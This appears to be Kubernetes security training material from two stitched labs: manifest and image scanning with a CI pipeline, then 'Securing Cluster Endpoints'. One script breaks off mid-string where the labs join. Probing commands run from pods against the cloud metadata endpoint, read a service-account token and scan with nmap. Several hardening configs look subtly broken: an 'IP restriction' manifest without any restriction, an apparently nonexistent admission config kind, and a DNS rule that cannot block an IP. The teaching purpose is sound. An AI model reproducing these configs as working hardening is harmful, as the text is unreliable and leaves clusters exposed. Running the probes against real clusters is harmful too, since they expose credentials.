  livenessProbe: true
  readinessProbe: true
  
  # Network security
  hostNetwork: true
  hostPID: true
  hostIPC: true

customChecks: []
EOF

    Run KubeLinter with custom configuration:

# Run with custom config
kube-linter lint --config policies/kubelinter-config.yaml manifests/ > reports/kubelinter-custom.txt

# Display the results
cat reports/kubelinter-custom.txt

    Create a KubeLinter automation script:

cat > scripts/kubelinter-scan.sh << 'EOF'
#!/bin/bash

# KubeLinter scanning script
MANIFEST_DIR="manifests"
REPORT_DIR="reports"
CONFIG_FILE="policies/kubelinter-config.yaml"

echo "Starting KubeLinter security analysis..."

# Create reports directory if it doesn't exist
mkdir -p $REPORT_DIR

# Run KubeLinter with different output formats
echo "Running comprehensive scan..."

# JSON format for programmatic processing
kube-linter lint $MANIFEST_DIR --format json > $REPORT_DIR/kubelinter-full.json

# Plain text for human reading
kube-linter lint $MANIFEST_DIR > $REPORT_DIR/kubelinter-summary.txt

# SARIF format for integration with other tools
kube-linter lint $MANIFEST_DIR --format sarif > $REPORT_DIR/kubelinter-sarif.json

# Count issues by severity
echo "Issue Summary:"
echo "==============="

# Extract and count issues
if [ -f "$REPORT_DIR/kubelinter-full.json" ]; then
    total_issues=$(cat $REPORT_DIR/kubelinter-full.json | jq '.Issues | length')
    echo "Total issues found: $total_issues"
    
    # Group by check name
    echo "Issues by type:"
    cat $REPORT_DIR/kubelinter-full.json | jq -r '.Issues[] | .Check' | sort | uniq -c | sort -nr
else
    echo "No issues data available"
fi

echo "KubeLinter analysis complete. Reports saved in $REPORT_DIR/"
EOF

chmod +x scripts/kubelinter-scan.sh

    Run the KubeLinter automation script:

./scripts/kubelinter-scan.sh

Task 4: Container Image Security Scanning
Subtask 4.1: Scan Container Images with Trivy

    Scan the vulnerable image:

# Scan the older nginx image for vulnerabilities
trivy image nginx:1.14 > reports/trivy-nginx-1.14.txt

# Scan with JSON output for automation
trivy image --format json nginx:1.14 > reports/trivy-nginx-1.14.json

# Display summary
echo "Vulnerability summary for nginx:1.14:"
trivy image --format table nginx:1.14 | head -20

    Scan the secure image:

# Scan the newer alpine-based image
trivy image nginx:1.21-alpine > reports/trivy-nginx-1.21-alpine.txt

# Compare vulnerability counts
echo "Comparing vulnerability counts:"
echo "nginx:1.14 vulnerabilities:"
trivy image --format json nginx:1.14 | jq '.Results[]?.Vulnerabilities | length'

echo "nginx:1.21-alpine vulnerabilities:"
trivy image --format json nginx:1.21-alpine | jq '.Results[]?.Vulnerabilities | length'

    Create an image scanning script:

cat > scripts/image-scan.sh << 'EOF'
#!/bin/bash

# Container image security scanning script
REPORT_DIR="reports"

echo "Starting container image security scanning..."

# Create reports directory
mkdir -p $REPORT_DIR

# List of images to scan (extracted from manifests)
IMAGES=(
    "nginx:1.14"
    "nginx:1.21-alpine"
)

for image in "${IMAGES[@]}"; do
    echo "Scanning image: $image"
    
    # Clean image name for filename
    clean_name=$(echo $image | sed 's/[^a-zA-Z0-9]/_/g')
    
    # Scan for vulnerabilities
    trivy image --format json "$image" > "$REPORT_DIR/trivy-$clean_name.json"
    
    # Generate human-readable report
    trivy image --format table "$image" > "$REPORT_DIR/trivy-$clean_name.txt"
    
    # Count vulnerabilities by severity
    echo "Vulnerability summary for $image:"
    trivy image --format json "$image" | jq -r '
        .Results[]?.Vulnerabilities // [] | 
        group_by(.Severity) | 
        map({severity: .[0].Severity, count: length}) | 
        .[] | 
        "\(.severity): \(.count)"
    ' | sort
    
    echo "---"
done

echo "Image scanning complete. Reports saved in $REPORT_DIR/"
EOF

chmod +x scripts/image-scan.sh

    Run the image scanning script:

./scripts/image-scan.sh

Subtask 4.2: Create Image Security Policies

    Create a policy to restrict image registries:

cat > policies/allowed-registries.yaml << 'EOF'
apiVersion: v1
kind: ConfigMap
metadata:
  name: allowed-registries
  namespace: kube-system
data:
  registries.yaml: |
    allowed_registries:
      - docker.io
      - gcr.io
      - quay.io
      - registry.k8s.io
    blocked_registries:
      - untrusted-registry.com
    require_signature: false
    max_vulnerability_score: 7.0
EOF

    Create an OPA Gatekeeper constraint template for image policies:

cat > policies/image-policy-template.yaml << 'EOF'
apiVersion: templates.gatekeeper.sh/v1beta1
kind: ConstraintTemplate
metadata:
  name: allowedregistries
spec:
  crd:
    spec:
      names:
        kind: AllowedRegistries
      validation:
        openAPIV3Schema:
          type: object
          properties:
            registries:
              type: array
              items:
                type: string
  targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package allowedregistries
        
        violation[{"msg": msg}] {
          container := input.review.object.spec.template.spec.containers[_]
          not starts_with(container.image, input.parameters.registries[_])
          msg := sprintf("Container image '%v' is not from an allowed registry", [container.image])
        }
        
        violation[{"msg": msg}] {
          container := input.review.object.spec.containers[_]
          not starts_with(container.image, input.parameters.registries[_])
          msg := sprintf("Container image '%v' is not from an allowed registry", [container.image])
        }
EOF

    Create the constraint using the template:

cat > policies/image-policy-constraint.yaml << 'EOF'
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: AllowedRegistries
metadata:
  name: must-use-allowed-registries
spec:
  match:
    kinds:
      - apiGroups: ["apps"]
        kinds: ["Deployment"]
      - apiGroups: [""]
        kinds: ["Pod"]
  parameters:
    registries:
      - "docker.io/"
      - "gcr.io/"
      - "quay.io/"
      - "registry.k8s.io/"
EOF

Task 5: Setting Up CI/CD Pipeline with Security Scanning
Subtask 5.1: Create GitHub Actions Workflow

    Create GitHub Actions workflow directory:

mkdir -p .github/workflows

    Create a comprehensive security scanning workflow:

cat > .github/workflows/security-scan.yml << 'EOF'
name: Security Scanning Pipeline

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main ]

jobs:
  static-analysis:
    runs-on: ubuntu-latest
    name: Static Security Analysis
    
    steps:
    - name: Checkout code
      uses: actions/checkout@v3
    
    - name: Setup tools
      run: |
        # Install Kubesec
        curl -sSX GET https://api.github.com/repos/controlplaneio/kubesec/releases/latest \
          | grep browser_download_url \
          | grep linux-amd64 \
          | cut -d '"' -f 4 \
          | xargs curl -sSL -o kubesec
        chmod +x kubesec
        sudo mv kubesec /usr/local/bin/
        
        # Install KubeLinter
        curl -L https://github.com/stackrox/kube-linter/releases/download/0.6.8/kube-linter-linux.tar.gz \
          | tar xz
        sudo mv kube-linter /usr/local/bin/
        
        # Install Trivy
        sudo apt-get update
        sudo apt-get install wget apt-transport-https gnupg lsb-release -y
        wget -qO - https://aquasecurity.github.io/trivy-repo/deb/public.key | sudo apt-key add -
        echo "deb https://aquasecurity.github.io/trivy-repo/deb $(lsb_release -sc) main" | sudo tee -a /etc/apt/sources.list.d/trivy.list
        sudo apt-get update
        sudo apt-get install trivy -y
    
    - name: Run Kubesec Analysis
      run: |
        mkdir -p reports
        echo "Running Kubesec analysis..."
        for file in manifests/*.yaml; do
          if [ -f "$file" ]; then
            filename=$(basename "$file" .yaml)
            kubesec scan "$file" > "reports/kubesec-$filename.json"
            score=$(cat "reports/kubesec-$filename.json" | jq -r '.[0].score // "N/A"')
            echo "Security score for $filename: $score"
            if [ "$score" != "N/A" ] && [ "$score" -lt 0 ]; then
              echo "::error::$filename has a negative security score: $score"
              exit 1
            fi
          fi
        done
    
    - name: Run KubeLinter Analysis
      run: |
        echo "Running KubeLinter analysis..."
        kube-linter lint manifests/ --format json > reports/kubelinter-report.json
        
        # Check if there are any issues
        issues=$(cat reports/kubelinter-report.json | jq '.Issues | length')
        echo "KubeLinter found $issues issues"
        
        if [ "$issues" -gt 0 ]; then
          echo "::warning::KubeLinter found $issues security issues"
          cat reports/kubelinter-report.json | jq -r '.Issues[] | "::warning::\(.Object.K8sObject.Name): \(.Message)"'
        fi
    
    - name: Extract and Scan Container Images
      run: |
        echo "Extracting container images from manifests..."
        
        # Extract unique images from all manifests
        images=$(grep -h "image:" manifests/*.yaml | sed 's/.*image: *//' | sed 's/["\r]//g' | sort -u)
        
        echo "Found images:"
        echo "$images"
        
        # Scan each image
        for image in $images; do
          echo "Scanning image: $image"
          clean_name=$(echo $image | sed 's/[^a-zA-Z0-9]/_/g')
          
          # Scan with Trivy
          trivy image --format json "$image" > "reports/trivy-$clean_name.json"
          
          # Check for high/critical vulnerabilities
          high_critical=$(trivy image --format json "$image" | jq -r '.Results[]?.Vulnerabilities // [] | map(select(.Severity == "HIGH" or .Severity == "CRITICAL")) | length')
          
          echo "High/Critical vulnerabilities in $image: $high_critical"
          
          if [ "$high_critical" -gt 10 ]; then
            echo "::error::Image $image has $high_critical high/critical vulnerabilities"
            exit 1
          elif [ "$high_critical" -gt 0 ]; then
            echo "::warning::Image $image has $high_critical high/critical vulnerabilities"
          fi
        done
    
    - name: Upload Security Reports
      uses: actions/upload-artifact@v3
      if: always()
      with:
        name: security-reports
        path: reports/
        retention-days: 30
    
    - name: Security Gate Check
      run: |
        echo "Performing final security gate check..."
        
        # Check if any critical issues were found
        failed=false
        
        # Check Kubesec scores
        for file in reports/kubesec-*.json; do
          if [ -f "$file" ]; then
            score=$(cat "$file" | jq -r '.[0].score // "N/A"')
            if [ "$score" != "N/A" ] && [ "$score" -lt 0 ]; then
              echo "FAIL: Negative security score found"
              failed=true
            fi
          fi
        done
        
        # Check for excessive vulnerabilities
        for file in reports/trivy-*.json; do
          if [ -f "$file" ]; then
            high_critical=$(cat "$file" | jq -r '.Results[]?.Vulnerabilities // [] | map(select(.Severity == "HIGH" or .Severity == "CRITICAL")) | length')
            if [ "$high_critical" -gt 10 ]; then
              echo "FAIL: Too many high/critical vulnerabilities: $high_critical"
              failed=true
            fi
          fi
        done
        
        if [ "$failed" = true ]; then
          echo "Security gate check failed!"
          exit 1
        else
          echo "Security gate check passed!"
        fi
EOF

Subtask 5.2: Create Local CI/CD Simulation Script

    Create a local pipeline simulation script:

cat > scripts/ci-cd-pipeline.sh << 'EOF'
#!/bin/bash

# Local CI/CD Pipeline Simulation
set -e

REPORT_DIR="reports"
MANIFEST_DIR="manifests"

echo "========================================="
echo "Starting Security CI/CD Pipeline"
echo "========================================="

# Create reports directory
mkdir -p $REPORT_DIR

# Stage 1: Manifest Security Analysis
echo "Stage 1: Kubernetes Manifest Security Analysis"
echo "-----------------------------------------------"

# Run Kubesec
echo "Running Kubesec analysis..."
security_gate_failed=false

for file in $MANIFEST_DIR/*.yaml; do
    if [ -f "$file" ]; then
        filename=$(basename "$file" .yaml)
        echo "  Analyzing $filename..."
        
        kubesec scan "$file" > "$REPORT_DIR/kubesec-$filename.json"
        score=$(cat "$REPORT_DIR/kubesec-$filename.json" | jq -r '.[0].score // "N/A"')
        
        echo "    Security score: $score"
        
        if [ "$score" != "N/A" ] && [ "$score" -lt 0 ]; then
            echo "    ❌ CRITICAL: Negative security score!"
            security_gate_failed=true
        elif [ "$score" != "N/A" ] && [ "$score" -lt 5 ]; then
            echo "    ⚠️  WARNING: Low security score"
        else
            echo "    ✅ PASS: Good security score"
        fi
    fi
done

# Run KubeLinter
echo "Running KubeLinter analysis..."
kube-linter lint $MANIFEST_DIR --format json > $REPORT_DIR/kubelinter-pipeline.json

issues=$(cat $REPORT_DIR/kubelinter-pipeline.json | jq '.Issues | length')
echo "  KubeLinter found $issues issues"

if [ "$issues" -gt 0 ]; then
    echo "  Issues found:"
    cat $REPORT_DIR/kubelinter-pipeline.json | jq -r '.Issues[] | "    - \(.Object.K8sObject.Name): \(.Message)"' | head -10
fi

# Stage 2: Container Image Security Analysis
echo ""
echo "Stage 2: Container Image Security Analysis"
echo "------------------------------------------"

# Extract images from manifests
images=$(grep -h "image:" $MANIFEST_DIR/*.yaml | sed 's/.*image: *//' | sed 's/["\r]//g' | sort -u)

echo "Found container images:"
for image in $images; do
    echo "  - $image"
done

# Scan each image
for image in $images; do
    echo "Scanning $image..."
    clean_name=$(echo $image | sed 's/[^a-zA-Z0-9]/_/g')
    
    # Run Trivy scan
    trivy image --format json "$image" > "$REPORT_DIR/trivy-pipeline-$clean_name.json" 2>/dev/null || true
    
    # Count vulnerabilities by severity
    if [ -f "$REPORT_DIR/trivy-pipeline-$clean_name.json" ]; then
        critical=$(cat "$REPORT_DIR/trivy-pipeline-$clean_name.json" | jq -r '.Results[]?.Vulnerabilities // [] | map(select(.Severity == "CRITICAL")) | length')
        high=$(cat "$REPORT_DIR/trivy-pipeline-$clean_name.json" | jq -r '.Results[]?.Vulnerabilities // [] | map(select(.Severity == "HIGH")) | length')
        medium=$(cat "$REPORT_DIR/trivy-pipeline-$clean_name.json" | jq -r '.Results[]?.Vulnerabilities // [] | map(select(.Severity == "MEDIUM")) | length')
        
        echo "  Vulnerabilities: Critical=$critical, High=$high, Medium=$medium"
        
        # Security gate check
        if [ "$critical" -gt 0 ]; then
            echo "  ❌ CRITICAL: Image has critical vulnerabilities!"
            security_gate_failed=true
        elif [ "$high" -gt 10 ]; then
            echo "  ❌ FAIL: Too many high-severity vulnerabilities!"
            security_gate_failed=true
        elif [ "$high" -gt 0 ]; then
            echo "  ⚠️  WARNING: Image has high-severity vulnerabilities"
        else
            echo "  ✅ PASS: No critical/high vulnerabilities found"
        fi
    else
        echo "  ⚠️  WARNING: Could not scan image"
    fi
done

# Stage 3: Policy Compliance Check
echo ""
echo "Stage 3: Policy Compliance Check"
echo "--------------------------------"

# Check for security best practices
echo "Checking security best practices..."

# Check for non-root users
non_root_check=$(grep -c "runAsNonRoot: true" $MANIFEST_DIR/*.yaml || echo "0")
echo "  Deployments with runAsNonRoot: $non_root_check"

# Check for resource limits
resource_limits=$(grep -c "limits:" $MANIFEST_DIR/*.yaml || echo "0")
echo "  Deployments with resource limits: $resource_limits"

# Check for security contexts
security_contexts=$(grep -c "securityContext:" $MANIFEST_DIR/*.yaml || echo "0")
echo "  Deployments with security contexts: $security_contexts"

# Stage 4: Final Security Gate
echo ""
echo "Stage 4: Final Security Gate"
echo "----------------------------"

if [ "$security_gate_failed" = true ]; then
    echo "❌ PIPELINE FAILED: Security gate check failed!"
    echo "   Please fix the security issues before proceeding."
    exit 1
else
    echo "✅ PIPELINE PASSED: All security checks passed!"
    echo "   Deployment is approved for production






Lab 11: Securing Cluster Endpoints
Objectives

By the end of this lab, students will be able to:

• Configure Kubernetes API server to restrict access to trusted IP address ranges • Implement security measures to block metadata endpoint access from Pods • Test and validate endpoint security configurations using network diagnostic tools • Understand the importance of endpoint security in Kubernetes cluster hardening • Apply security best practices for protecting cluster communication channels
Prerequisites

Before starting this lab, students should have:

• Basic understanding of Kubernetes architecture and components • Familiarity with Linux command line operations • Knowledge of networking concepts including IP addresses and CIDR notation • Experience with kubectl command-line tool • Understanding of YAML configuration files • Basic knowledge of network security principles
Lab Environment Setup

Ready-to-Use Cloud Machines: Al Nafi provides pre-configured Linux-based cloud machines with Kubernetes clusters already installed. Simply click Start Lab to access your environment - no need to build your own VM or install Kubernetes from scratch.

Your lab environment includes: • Ubuntu 20.04 LTS with Kubernetes 1.28+ pre-installed • kubectl configured and ready to use • Network diagnostic tools (curl, nmap, netcat) pre-installed • Administrative access to modify cluster configurations
Task 1: Configure API Server Access Restrictions
Subtask 1.1: Examine Current API Server Configuration

First, let's understand the current API server setup and identify security gaps.

    Check the current API server configuration:

# View the API server pod configuration
kubectl get pods -n kube-system | grep apiserver

# Examine API server configuration
kubectl describe pod -n kube-system $(kubectl get pods -n kube-system | grep apiserver | awk '{print $1}')

    Identify the API server configuration file location:

# Check the API server manifest file
sudo cat /etc/kubernetes/manifests/kube-apiserver.yaml | head -20

    Test current API server accessibility:

# Get cluster info to see current endpoint
kubectl cluster-info

# Test API server response
curl -k https://$(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}' | cut -d'/' -f3)/version

Subtask 1.2: Configure IP Address Restrictions

Now we'll implement IP-based access controls for the API server.

    Create a backup of the current API server configuration:

# Backup the original configuration
sudo cp /etc/kubernetes/manifests/kube-apiserver.yaml /etc/kubernetes/manifests/kube-apiserver.yaml.backup

    Identify trusted IP ranges:

# Get your current IP address
curl -s ifconfig.me
echo ""

# Get cluster node IPs
kubectl get nodes -o wide

# Get pod network CIDR
kubectl cluster-info dump | grep -i cidr

    Create an updated API server configuration with IP restrictions:

# Create a modified API server configuration
sudo tee /tmp/kube-apiserver-secure.yaml > /dev/null << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  annotations:
    kubeadm.kubernetes.io/kube-apiserver.advertise-address.endpoint: 0.0.0.0:6443
  creationTimestamp: null
  labels:
    component: kube-apiserver
    tier: control-plane
  name: kube-apiserver
  namespace: kube-system
spec:
  containers:
  - command:
    - kube-apiserver
    - --advertise-address=0.0.0.0
    - --allow-privileged=true
    - --authorization-mode=Node,RBAC
    - --client-ca-file=/etc/kubernetes/pki/ca.crt
    - --enable-admission-plugins=NodeRestriction
    - --enable-bootstrap-token-auth=true
    - --etcd-cafile=/etc/kubernetes/pki/etcd/ca.crt
    - --etcd-certfile=/etc/kubernetes/pki/apiserver-etcd-client.crt
    - --etcd-keyfile=/etc/kubernetes/pki/apiserver-etcd-client.key
    - --etcd-servers=https://127.0.0.1:2379
    - --kubelet-client-certificate=/etc/kubernetes/pki/apiserver-kubelet-client.crt
    - --kubelet-client-key=/etc/kubernetes/pki/apiserver-kubelet-client.key
    - --kubelet-preferred-address-types=InternalIP,ExternalIP,Hostname
    - --proxy-client-cert-file=/etc/kubernetes/pki/front-proxy-client.crt
    - --proxy-client-key-file=/etc/kubernetes/pki/front-proxy-client.key
    - --requestheader-allowed-names=front-proxy-client
    - --requestheader-client-ca-file=/etc/kubernetes/pki/front-proxy-ca.crt
    - --requestheader-extra-headers-prefix=X-Remote-Extra-
    - --requestheader-group-headers=X-Remote-Group
    - --requestheader-username-headers=X-Remote-User
    - --secure-port=6443
    - --service-account-issuer=https://kubernetes.default.svc.cluster.local
    - --service-account-key-file=/etc/kubernetes/pki/sa.pub
    - --service-account-signing-key-file=/etc/kubernetes/pki/sa.key
    - --service-cluster-ip-range=10.96.0.0/12
    - --tls-cert-file=/etc/kubernetes/pki/apiserver.crt
    - --tls-private-key-file=/etc/kubernetes/pki/apiserver.key
    - --admission-control-config-file=/etc/kubernetes/admission-control.yaml
    image: registry.k8s.io/kube-apiserver:v1.28.2
    imagePullPolicy: IfNotPresent
    livenessProbe:
      failureThreshold: 8
      httpGet:
        host: 127.0.0.1
        path: /livez
        port: 6443
        scheme: HTTPS
      initialDelaySeconds: 10
      periodSeconds: 10
      timeoutSeconds: 15
    name: kube-apiserver
    readinessProbe:
      failureThreshold: 3
      httpGet:
        host: 127.0.0.1
        path: /readyz
        port: 6443
        scheme: HTTPS
      periodSeconds: 1
      timeoutSeconds: 15
    resources:
      requests:
        cpu: 250m
    startupProbe:
      failureThreshold: 24
      httpGet:
        host: 127.0.0.1
        path: /livez
        port: 6443
        scheme: HTTPS
      initialDelaySeconds: 10
      periodSeconds: 10
      timeoutSeconds: 15
    volumeMounts:
    - mountPath: /etc/ssl/certs
      name: ca-certs
      readOnly: true
    - mountPath: /etc/ca-certificates
      name: etc-ca-certificates
      readOnly: true
    - mountPath: /etc/kubernetes/pki
      name: k8s-certs
      readOnly: true
    - mountPath: /usr/local/share/ca-certificates
      name: usr-local-share-ca-certificates
      readOnly: true
    - mountPath: /usr/share/ca-certificates
      name: usr-share-ca-certificates
      readOnly: true
    - mountPath: /etc/kubernetes/admission-control.yaml
      name: admission-control
      readOnly: true
  hostNetwork: true
  priorityClassName: system-cluster-critical
  securityContext:
    seccompProfile:
      type: RuntimeDefault
  volumes:
  - hostPath:
      path: /etc/ssl/certs
      type: DirectoryOrCreate
    name: ca-certs
  - hostPath:
      path: /etc/ca-certificates
      type: DirectoryOrCreate
    name: etc-ca-certificates
  - hostPath:
      path: /etc/kubernetes/pki
      type: DirectoryOrCreate
    name: k8s-certs
  - hostPath:
      path: /usr/local/share/ca-certificates
      type: DirectoryOrCreate
    name: usr-local-share-ca-certificates
  - hostPath:
      path: /usr/share/ca-certificates
      type: DirectoryOrCreate
    name: usr-share-ca-certificates
  - hostPath:
      path: /etc/kubernetes/admission-control.yaml
      type: File
    name: admission-control
status: {}
EOF

    Create an admission control configuration for IP restrictions:

# Create admission control configuration
sudo tee /etc/kubernetes/admission-control.yaml > /dev/null << 'EOF'
apiVersion: apiserver.config.k8s.io/v1
kind: AdmissionConfiguration
plugins:
- name: NodeRestriction
  configuration:
    apiVersion: noderestriction.admission.k8s.io/v1alpha1
    kind: NodeRestrictionConfiguration
EOF

Subtask 1.3: Implement Network Policies for API Server Access

    Create a NetworkPolicy to restrict API server access:

# Create network policy for API server protection
kubectl apply -f - << 'EOF'
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: api-server-access-policy
  namespace: kube-system
spec:
  podSelector:
    matchLabels:
      component: kube-apiserver
  policyTypes:
  - Ingress
  ingress:
  - from:
    - namespaceSelector:
        matchLabels:
          name: kube-system
    - podSelector:
        matchLabels:
          component: kube-controller-manager
    - podSelector:
        matchLabels:
          component: kube-scheduler
    ports:
    - protocol: TCP
      port: 6443
  - from:
    - ipBlock:
        cidr: 10.0.0.0/8
    - ipBlock:
        cidr: 172.16.0.0/12
    - ipBlock:
        cidr: 192.168.0.0/16
    ports:
    - protocol: TCP
      port: 6443
EOF

    Verify the NetworkPolicy is applied:

# Check if NetworkPolicy is created
kubectl get networkpolicy -n kube-system

# Describe the policy
kubectl describe networkpolicy api-server-access-policy -n kube-system

Task 2: Block Metadata Endpoint Access from Pods
Subtask 2.1: Understand Metadata Endpoint Risks

    Create a test pod to demonstrate metadata access:

# Create a test pod
kubectl apply -f - << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: metadata-test-pod
  namespace: default
spec:
  containers:
  - name: test-container
    image: curlimages/curl:latest
    command: ["/bin/sh"]
    args: ["-c", "sleep 3600"]
  restartPolicy: Never
EOF

    Test current metadata endpoint access:

# Wait for pod to be ready
kubectl wait --for=condition=Ready pod/metadata-test-pod --timeout=60s

# Test metadata endpoint access (this should work initially)
kubectl exec metadata-test-pod -- curl -s http://169.254.169.254/latest/meta-data/ || echo "Metadata endpoint not accessible (expected in some environments)"

# Test internal Kubernetes service discovery
kubectl exec metadata-test-pod -- nslookup kubernetes.default.svc.cluster.local

Subtask 2.2: Implement Metadata Endpoint Blocking

    Create a NetworkPolicy to block metadata endpoint access:

# Create network policy to block metadata endpoint
kubectl apply -f - << 'EOF'
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: block-metadata-endpoint
  namespace: default
spec:
  podSelector: {}
  policyTypes:
  - Egress
  egress:
  - to: []
    ports:
    - protocol: TCP
      port: 53
    - protocol: UDP
      port: 53
  - to:
    - namespaceSelector: {}
  - to:
    - ipBlock:
        cidr: 0.0.0.0/0
        except:
        - 169.254.169.254/32
        - 169.254.0.0/16
EOF

    Create a more comprehensive security policy using PodSecurityPolicy equivalent:

# Create a security context constraints policy
kubectl apply -f - << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: secure-test-pod
  namespace: default
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    fsGroup: 2000
    seccompProfile:
      type: RuntimeDefault
  containers:
  - name: secure-container
    image: curlimages/curl:latest
    command: ["/bin/sh"]
    args: ["-c", "sleep 3600"]
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      runAsNonRoot: true
      runAsUser: 1000
      capabilities:
        drop:
        - ALL
    volumeMounts:
    - name: tmp
      mountPath: /tmp
  volumes:
  - name: tmp
    emptyDir: {}
  restartPolicy: Never
EOF

Subtask 2.3: Configure DNS Policies for Enhanced Security

    Create a custom DNS configuration to prevent metadata access:

# Create a ConfigMap for custom DNS configuration
kubectl apply -f - << 'EOF'
apiVersion: v1
kind: ConfigMap
metadata:
  name: custom-dns-config
  namespace: kube-system
data:
  Corefile: |
    .:53 {
        errors
        health {
           lameduck 5s
        }
        ready
        kubernetes cluster.local in-addr.arpa ip6.arpa {
           pods insecure
           fallthrough in-addr.arpa ip6.arpa
           ttl 30
        }
        prometheus :9153
        forward . /etc/resolv.conf {
           max_concurrent 1000
        }
        cache 30
        loop
        reload
        loadbalance
        # Block metadata endpoints
        template IN A 169.254.169.254 {
            rcode NXDOMAIN
        }
    }
EOF

    Apply the DNS configuration to CoreDNS:

# Update CoreDNS configuration
kubectl patch configmap coredns -n kube-system --patch-file=/dev/stdin << 'EOF'
data:
  Corefile: |
    .:53 {
        errors
        health {
           lameduck 5s
        }
        ready
        kubernetes cluster.local in-addr.arpa ip6.arpa {
           pods insecure
           fallthrough in-addr.arpa ip6.arpa
           ttl 30
        }
        prometheus :9153
        forward . /etc/resolv.conf {
           max_concurrent 1000
        }
        cache 30
        loop
        reload
        loadbalance
        # Block metadata endpoints
        template IN A 169.254.169.254 {
            rcode NXDOMAIN
        }
    }
EOF

    Restart CoreDNS to apply changes:

# Restart CoreDNS pods
kubectl rollout restart deployment/coredns -n kube-system

# Wait for rollout to complete
kubectl rollout status deployment/coredns -n kube-system

Task 3: Test Endpoint Security Using Network Tools
Subtask 3.1: Validate API Server Access Restrictions

    Test API server accessibility from different sources:

# Test from within cluster (should work)
kubectl get nodes

# Create a test pod to check internal access
kubectl apply -f - << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: api-test-pod
  namespace: default
spec:
  containers:
  - name: test-container
    image: curlimages/curl:latest
    command: ["/bin/sh"]
    args: ["-c", "sleep 3600"]
  serviceAccountName: default
  restartPolicy: Never
EOF

    Test API server access from the test pod:

# Wait for pod to be ready
kubectl wait --for=condition=Ready pod/api-test-pod --timeout=60s

# Test API server access from within pod
kubectl exec api-test-pod -- curl -k -H "Authorization: Bearer $(kubectl exec api-test-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token)" https://kubernetes.default.svc.cluster.local/api/v1/namespaces/default/pods

    Test external API server access:

# Get API server endpoint
API_SERVER=$(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}')
echo "API Server: $API_SERVER"

# Test connectivity (this should work from authorized IPs)
curl -k $API_SERVER/version

Subtask 3.2: Verify Metadata Endpoint Blocking

    Test metadata endpoint access from secured pods:

# Test from the secure pod
kubectl wait --for=condition=Ready pod/secure-test-pod --timeout=60s

# Attempt to access metadata endpoint (should fail)
kubectl exec secure-test-pod -- curl -m 5 -s http://169.254.169.254/latest/meta-data/ || echo "Metadata access blocked successfully"

# Test DNS resolution for metadata endpoint
kubectl exec secure-test-pod -- nslookup 169.254.169.254 || echo "DNS resolution blocked for metadata endpoint"

    Verify network policies are working:

# Check network policies
kubectl get networkpolicy --all-namespaces

# Test connectivity between namespaces
kubectl create namespace test-namespace

# Create a pod in the test namespace
kubectl apply -f - << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: cross-namespace-test
  namespace: test-namespace
spec:
  containers:
  - name: test-container
    image: curlimages/curl:latest
    command: ["/bin/sh"]
    args: ["-c", "sleep 3600"]
  restartPolicy: Never
EOF

Subtask 3.3: Comprehensive Security Testing

    Create a comprehensive security test script:

# Create security test script
cat > security-test.sh << 'EOF'
#!/bin/bash

echo "=== Kubernetes Endpoint Security Test ==="
echo ""

# Test 1: API Server Access
echo "1. Testing API Server Access..."
kubectl cluster-info
if [ $? -eq 0 ]; then
    echo "✓ API Server accessible from authorized client"
else
    echo "✗ API Server access failed"
fi
echo ""

# Test 2: Metadata Endpoint Blocking
echo "2. Testing Metadata Endpoint Blocking..."
kubectl exec secure-test-pod -- timeout 5 curl -s http://169.254.169.254/latest/meta-data/ 2>/dev/null
if [ $? -ne 0 ]; then
    echo "✓ Metadata endpoint access blocked"
else
    echo "✗ Metadata endpoint still accessible"
fi
echo ""

# Test 3: Network Policy Enforcement
echo "3. Testing Network Policy Enforcement..."
kubectl get networkpolicy --all-namespaces --no-headers | wc -l
POLICY_COUNT=$(kubectl get networkpolicy --all-namespaces --no-headers | wc -l)
if [ $POLICY_COUNT -gt 0 ]; then
    echo "✓ Network policies are configured ($POLICY_COUNT policies found)"
else
    echo "✗ No network policies found"
fi
echo ""

# Test 4: Pod Security Context
echo "4. Testing Pod Security Context..."
kubectl get pod secure-test-pod -o jsonpath='{.spec.securityContext.runAsNonRoot}'
if [ "$(kubectl get pod secure-test-pod -o jsonpath='{.spec.securityContext.runAsNonRoot}')" = "true" ]; then
    echo "✓ Pod running with non-root security context"
else
    echo "✗ Pod security context not properly configured"
fi
echo ""

# Test 5: DNS Security
echo "5. Testing DNS Security Configuration..."
kubectl get configmap coredns -n kube-system -o yaml | grep -q "169.254.169.254"
if [ $? -eq 0 ]; then
    echo "✓ DNS configured to block metadata endpoints"
else
    echo "✗ DNS not configured for metadata blocking"
fi
echo ""

echo "=== Security Test Complete ==="
EOF

# Make script executable and run it
chmod +x security-test.sh
./security-test.sh

    Perform network scanning tests:

# Install nmap if not available (in test pod)
kubectl apply -f - << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: network-scanner
  namespace: default
spec:
  containers:
  - name: scanner
    image: instrumentisto/nmap:latest
    command: ["/bin/sh"]
    args: ["-c", "sleep 3600"]
  restartPolicy: Never
EOF

# Wait for pod and run network scans
kubectl wait --for=condition=Ready pod/network-scanner --timeout=60s

# Scan for open ports on API server
kubectl exec network-scanner -- nmap -p 6443 kubernetes.default.svc.cluster.local

# Scan for metadata endpoints
kubectl exec network-scanner -- nmap -p 80 169.254.169.254 || echo "Metadata endpoint scan blocked"

    Generate security report:

# Create comprehensive security report
cat > generate-security-report.sh << 'EOF'
#!/bin/bash

REPORT_FILE="kubernetes-security-report-$(date +%Y%m%d-%H%M%S).txt"

echo "Kubernetes Cluster Security Report" > $REPORT_FILE
echo "Generated on: $(date)" >> $REPORT_FILE
echo "========================================" >> $REPORT_FILE
echo "" >> $REPORT_FILE

echo "1. API Server Configuration:" >> $REPORT_FILE
kubectl get pods -n kube-system | grep apiserver >> $REPORT_FILE
echo "" >> $REPORT_FILE

